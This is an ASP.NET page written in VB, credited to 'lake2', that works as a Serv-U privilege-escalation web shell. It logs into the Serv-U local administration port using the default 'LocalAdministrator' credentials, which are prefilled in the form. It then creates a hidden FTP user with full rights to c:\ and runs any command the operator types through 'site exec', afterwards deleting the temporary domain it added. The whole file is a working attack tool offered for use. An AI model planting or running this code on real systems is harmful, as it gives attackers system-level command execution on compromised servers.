<%@ Page Language="VB" Debug="true" %>
<%@ import Namespace="System.Net.Sockets" %>
<script runat="server">

'
' Love, Where are you ?

Sub BTN_Start_Click(sender As Object, e As EventArgs)
Dim Usr As String = Text_Name.Text
Dim pwd As String = Text_PWD.Text
Dim Port As Int32 = Text_Port.Text
Dim Command As String = Text_cmd.Text

Dim LoginUser As String = "User " & Usr & vbcrlf
Dim LoginPass As String = "Pass " & pwd & vbcrlf
Dim NewDomain As String = "-SETDOMAIN" & vbcrlf & "-Domain=cctv|0.0.0.0|43859|-1|1|0" & vbcrlf & "-TZOEnable=0" & vbcrlf & " TZOKey=" & vbcrlf
Dim DelDomain As String = "-DELETEDOMAIN" & vbcrlf & "-IP=0.0.0.0" & vbcrlf & " PortNo=43859" & vbcrlf
Dim NewUser AS String = "-SETUSERSETUP" & vbcrlf & "-IP=0.0.0.0" & vbcrlf & "-PortNo=43859" & vbcrlf & "-User=lake" & vbcrlf & "-Password=admin123" & vbcrlf & _
"-HomeDir=c:\\" & vbcrlf & "-LoginMesFile=" & vbcrlf & "-Disable=0" & vbcrlf & "-RelPaths=1" & vbcrlf & _
"-NeedSecure=0" & vbcrlf & "-HideHidden=0" & vbcrlf & "-AlwaysAllowLogin=0" & vbcrlf & "-ChangePassword=0" & vbcrlf & _
"-QuotaEnable=0" & vbcrlf & "-MaxUsersLoginPerIP=-1" & vbcrlf & "-SpeedLimitUp=0" & vbcrlf & "-SpeedLimitDown=0" & vbcrlf & _
"-MaxNrUsers=-1" & vbcrlf & "-IdleTimeOut=600" & vbcrlf & "-SessionTimeOut=-1" & vbcrlf & "-Expire=0" & vbcrlf & "-RatioUp=1" & vbcrlf & _
"-RatioDown=1" & vbcrlf & "-RatiosCredit=0" & vbcrlf & "-QuotaCurrent=0" & vbcrlf & "-QuotaMaximum=0" & vbcrlf & _
"-Maintenance=System" & vbcrlf & "-PasswordType=Regular" & vbcrlf & "-Ratios=None" & vbcrlf & " Access=c:\\|RWAMELCDP" & vbcrlf
Dim Quit As String = "QUIT" & vbcrlf
Dim MAINTENANCE As String = "SITE MAINTENANCE" & vbcrlf

'Dim client As New TcpClient
Dim tcpClient As New TcpClient()
Try
tcpClient.Connect("127.0.0.1", port)
Catch eee As Exception
response.write(eee.ToString())
response.end
End Try
tcpClient.ReceiveBufferSize = 1024
Dim networkStream As NetworkStream = tcpClient.GetStream()
Rec(networkStream)
Send(networkStream, LoginUser)
Rec(networkStream)
Send(networkStream, LoginPass)
Rec(networkStream)
Send(networkStream, MAINTENANCE)
Rec(networkStream)
Send(networkStream, DelDomain)
Rec(networkStream)
Send(networkStream, NewDomain)
Rec(networkStream)
Send(networkStream, NewUser)
Rec(networkStream)
Dim tcpClient2 As New TcpClient()
Try
tcpClient2.Connect("127.0.0.1", 43859)
Catch eee As Exception
response.write(eee.ToString())
response.end
End Try
tcpClient2.ReceiveBufferSize = 1024
Dim networkStream2 As NetworkStream = tcpClient2.GetStream()
Rec(networkStream2)
Send(networkStream2, "User lake" & vbcrlf)
Rec(networkStream2)
Send(networkStream2, "pass admin123" & vbcrlf)
Rec(networkStream2)
Send(networkStream2, "site exec " & Command & vbcrlf)
Rec(networkStream2)
tcpClient2.Close()
Send(networkStream, DelDomain)
Rec(networkStream)
Send(networkStream, Quit)
Rec(networkStream)
tcpClient.Close()
End Sub


Sub Rec(o As Object)
If o.CanRead Then
Dim bytes(1024) As Byte
o.Read(bytes, 0, 1024)
Dim returndata As String = Encoding.ASCII.GetString(bytes)
response.Write("out:" & returndata & "<br>")
Else
response.Write("What's wrong ?")
End If
End Sub

Sub Send(o As Object,data As String)
If o.CanWrite Then
Dim sendBytes As [Byte]() = Encoding.ASCII.GetBytes(data)
o.Write(sendBytes, 0, sendBytes.Length)
response.write("in: " & data & "<br>")
Else
response.Write("What's wrong ?")
End If
End Sub

</script>
<html>
<head>
</head>
<body>
<form runat="server">
<p>
<asp:Label id="Label1" runat="server" width="353px" forecolor="Blue">from Serv-U 2
admin by lake2</asp:Label>
</p>
<p>
<asp:Label id="Label2" runat="server" width="40px">Name</asp:Label>
<asp:TextBox id="Text_Name" runat="server" Width="152px">LocalAdministrator</asp:TextBox>
<br />
<asp:Label id="Label3" runat="server" width="40px">PWD</asp:Label>
<asp:TextBox id="Text_PWD" runat="server">#l@$ak#.lk;0@P</asp:TextBox>
<br />
<asp:Label id="Label4" runat="server" width="40px">Port</asp:Label>
<asp:TextBox id="Text_Port" runat="server">43958</asp:TextBox>
<br />
<asp:Label id="Label5" runat="server" width="40px">cmd</asp:Label>
<asp:TextBox id="Text_cmd" runat="server"></asp:TextBox>
</p>
<p>
<asp:Button id="BTN_Start" onclick="BTN_Start_Click" runat="server" Text="Start"></asp:Button>
</p>
<p>
<hr />
<!-- Insert content here -->
</p>
</form>
</body>
</html>